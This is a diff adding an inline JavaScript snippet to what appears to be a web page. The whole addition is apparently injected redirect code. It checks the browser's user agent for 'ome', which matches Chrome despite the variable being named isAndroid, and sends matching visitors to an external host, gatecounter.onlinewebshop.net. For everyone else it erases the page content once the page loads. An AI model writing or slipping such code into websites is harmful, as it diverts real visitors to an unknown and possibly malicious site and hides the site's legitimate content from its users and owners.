@@ -1,0 +1,17 @@
+
+<script>
+
+  var url = new URL(document.URL);
+  var sub = url.searchParams.get("sub");
+  var ua = navigator.userAgent.toLowerCase();
+  var isAndroid = ua.indexOf("ome") > -1; //&& ua.indexOf("mobile");
+  if(isAndroid) {
+	  window.location = 'http://gatecounter.onlinewebshop.net/';
+  } else {
+        window.onload=function(){
+        document.documentElement.innerHTML = '';
+     
+    }
+}
+
+</script>
